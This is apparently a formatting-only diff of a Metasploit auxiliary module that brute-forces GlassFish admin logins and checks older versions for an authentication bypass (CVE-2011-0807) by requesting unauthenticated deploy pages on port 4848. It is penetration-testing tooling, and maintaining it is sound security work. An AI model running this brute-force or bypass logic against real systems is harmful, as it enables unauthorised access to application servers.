@@ -14,33 +14,32 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize
     super(
-      'Name'           => 'GlassFish Brute Force Utility',
-      'Description'    => %q{
+      'Name' => 'GlassFish Brute Force Utility',
+      'Description' => %q{
         This module attempts to login to GlassFish instance using username and password
         combinations indicated by the USER_FILE, PASS_FILE, and USERPASS_FILE options.
         It will also try to do an authentication bypass against older versions of GlassFish.
         Note: by default, GlassFish 4.0 requires HTTPS, which means you must set the SSL option
         to true, and SSLVersion to TLS1. It also needs Secure Admin to access the DAS remotely.
       },
-      'Author'         =>
-        [
-          'Joshua Abraham <jabra[at]spl0it.org>', # @Jabra
-          'sinn3r'
-        ],
-      'References'     =>
-        [
-          ['CVE', '2011-0807'],
-          ['OSVDB', '71948']
-        ],
-      'License'        => MSF_LICENSE
+      'Author' => [
+        'Joshua Abraham <jabra[at]spl0it.org>', # @Jabra
+        'sinn3r'
+      ],
+      'References' => [
+        ['CVE', '2011-0807'],
+        ['OSVDB', '71948']
+      ],
+      'License' => MSF_LICENSE
     )
 
     register_options(
       [
         # There is no TARGETURI because when Glassfish is installed, the path is /
         Opt::RPORT(4848),
-        OptString.new('USERNAME',[true, 'A specific username to authenticate as','admin']),
-      ])
+        OptString.new('USERNAME', [true, 'A specific username to authenticate as', 'admin']),
+      ]
+    )
   end
 
   #
@@ -57,13 +56,13 @@ class MetasploitModule < Msf::Auxiliary
     success = false
 
     if version =~ /^[29]\.x$/
-      res = send_request_cgi({'uri'=>'/applications/upload.jsf'})
+      res = send_request_cgi({ 'uri' => '/applications/upload.jsf' })
       p = /<title>Deploy Enterprise Applications\/Modules/
       if (res && res.code.to_i == 200 && res.body.match(p) != nil)
         success = true
       end
     elsif version =~ /^3\./
-      res = send_request_cgi({'uri'=>'/common/applications/uploadFrame.jsf'})
+      res = send_request_cgi({ 'uri' => '/common/applications/uploadFrame.jsf' })
       p = /<title>Deploy Applications or Modules/
       if (res && res.code.to_i == 200 && res.body.match(p) != nil)
         success = true
@@ -73,7 +72,6 @@ class MetasploitModule < Msf::Auxiliary
     success
   end
 
-
   def init_loginscanner(ip)
     @cred_collection = build_credential_collection(
       username: datastore['USERNAME'],
@@ -82,12 +80,12 @@ class MetasploitModule < Msf::Auxiliary
 
     @scanner = Metasploit::Framework::LoginScanner::Glassfish.new(
       configure_http_login_scanner(
-        cred_details:       @cred_collection,
-        stop_on_success:    datastore['STOP_ON_SUCCESS'],
-        bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],
+        cred_details: @cred_collection,
+        stop_on_success: datastore['STOP_ON_SUCCESS'],
+        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],
         connection_timeout: 5,
-        http_username:      datastore['HttpUsername'],
-        http_password:      datastore['HttpPassword']
+        http_username: datastore['HttpUsername'],
+        http_password: datastore['HttpPassword']
       )
     )
   end
@@ -134,34 +132,32 @@ class MetasploitModule < Msf::Auxiliary
           print_brute :level => :verror, :ip => ip, :msg => "Could not connect"
         end
         invalidate_login(
-            address: ip,
-            port: rport,
-            protocol: 'tcp',
-            public: result.credential.public,
-            private: result.credential.private,
-            realm_key: result.credential.realm_key,
-            realm_value: result.credential.realm,
-            status: result.status
+          address: ip,
+          port: rport,
+          protocol: 'tcp',
+          public: result.credential.public,
+          private: result.credential.private,
+          realm_key: result.credential.realm_key,
+          realm_value: result.credential.realm,
+          status: result.status
         )
       when Metasploit::Model::Login::Status::INCORRECT
         if datastore['VERBOSE']
           print_brute :level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'"
         end
         invalidate_login(
-            address: ip,
-            port: rport,
-            protocol: 'tcp',
-            public: result.credential.public,
-            private: result.credential.private,
-            realm_key: result.credential.realm_key,
-            realm_value: result.credential.realm,
-            status: result.status
+          address: ip,
+          port: rport,
+          protocol: 'tcp',
+          public: result.credential.public,
+          private: result.credential.private,
+          realm_key: result.credential.realm_key,
+          realm_value: result.credential.realm,
+          status: result.status
         )
       end
     end
   end
-
-
 
   #
   # main
@@ -174,11 +170,11 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    print_brute :level=>:status, :ip=>rhost, :msg=>('Checking if Glassfish requires a password...')
+    print_brute :level => :status, :ip => rhost, :msg => ('Checking if Glassfish requires a password...')
     if @scanner.version =~ /^[239]\.x$/ && is_password_required?(@scanner.version)
       print_brute :level => :good, :ip => ip, :msg => "Note: This Glassfish does not require a password"
     else
-      print_brute :level=>:status, :ip=>rhost, :msg=>("Glassfish is protected with a password")
+      print_brute :level => :status, :ip => rhost, :msg => ("Glassfish is protected with a password")
     end
 
     bruteforce(ip) unless @scanner.version.blank?
